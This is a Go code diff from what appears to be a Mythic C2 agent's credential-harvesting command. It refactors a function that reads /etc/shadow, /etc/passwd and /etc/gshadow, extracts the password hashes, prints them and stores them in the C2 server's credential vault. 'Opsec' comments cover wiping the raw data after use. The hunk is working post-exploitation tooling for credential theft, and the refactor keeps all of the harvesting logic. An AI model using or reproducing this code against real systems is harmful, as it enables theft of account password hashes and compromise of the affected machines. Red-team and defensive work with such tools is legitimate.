@@ -37,40 +37,18 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	if data, err := os.ReadFile("/etc/shadow"); err == nil {
 		defer structs.ZeroBytes(data) // opsec: clear raw shadow data
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
-		count := 0
-		for _, line := range lines {
-			if line == "" {
-				continue
-			}
-			parts := strings.SplitN(line, ":", 3)
-			if len(parts) < 2 {
-				continue
-			}
-			user := parts[0]
-			hash := parts[1]
-
-			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
-				continue
-			}
-
-			// Skip locked/disabled accounts
-			if hash == "*" || hash == "" || strings.HasPrefix(hash, "!") {
-				continue
-			}
-
-			sb.WriteString(fmt.Sprintf("  %s:%s\n", user, hash))
-			count++
-
-			// Report hash to Mythic credential vault
+		entries := parseShadowLines(lines, args.User)
+		for _, e := range entries {
+			sb.WriteString(fmt.Sprintf("  %s:%s\n", e.User, e.Hash))
 			creds = append(creds, structs.MythicCredential{
 				CredentialType: "hash",
 				Realm:          "",
-				Account:        user,
-				Credential:     hash,
+				Account:        e.User,
+				Credential:     e.Hash,
 				Comment:        "cred-harvest shadow",
 			})
 		}
-		if count == 0 {
+		if len(entries) == 0 {
 			sb.WriteString("  (no password hashes found — accounts may be locked)\n")
 		}
 	} else {
@@ -81,29 +59,11 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
 	if data, err := os.ReadFile("/etc/passwd"); err == nil {
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
-		for _, line := range lines {
-			parts := strings.Split(line, ":")
-			if len(parts) < 7 {
-				continue
-			}
-			user := parts[0]
-			shell := parts[6]
-
-			if args.User != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(args.User)) {
-				continue
-			}
-
-			if strings.Contains(shell, "nologin") || strings.Contains(shell, "false") || shell == "/usr/sbin/nologin" || shell == "/bin/false" {
-				continue
-			}
-
-			uid := parts[2]
-			gid := parts[3]
-			home := parts[5]
-			sb.WriteString(fmt.Sprintf("  %s (uid=%s, gid=%s, home=%s, shell=%s)\n", user, uid, gid, home, shell))
-
-			if parts[1] != "x" && parts[1] != "*" && parts[1] != "" {
-				sb.WriteString(fmt.Sprintf("    WARNING: Password hash in /etc/passwd: %s\n", parts[1]))
+		entries := parsePasswdLines(lines, args.User)
+		for _, e := range entries {
+			sb.WriteString(fmt.Sprintf("  %s (uid=%s, gid=%s, home=%s, shell=%s)\n", e.User, e.UID, e.GID, e.Home, e.Shell))
+			if e.PasswdHash != "" {
+				sb.WriteString(fmt.Sprintf("    WARNING: Password hash in /etc/passwd: %s\n", e.PasswdHash))
 			}
 		}
 	}
@@ -113,16 +73,11 @@ func credShadow(args credHarvestArgs) structs.CommandResult {
 	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
 		defer structs.ZeroBytes(data) // opsec: clear raw gshadow data
 		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
-		count := 0
-		for _, line := range lines {
-			parts := strings.SplitN(line, ":", 3)
-			if len(parts) < 2 || parts[1] == "" || parts[1] == "!" || parts[1] == "*" {
-				continue
-			}
-			sb.WriteString(fmt.Sprintf("  %s\n", line))
-			count++
+		entries := parseGshadowLines(lines)
+		for _, e := range entries {
+			sb.WriteString(fmt.Sprintf("  %s\n", e.Line))
 		}
-		if count == 0 {
+		if len(entries) == 0 {
 			sb.WriteString("  (no group passwords found)\n")
 		}
 	} else {
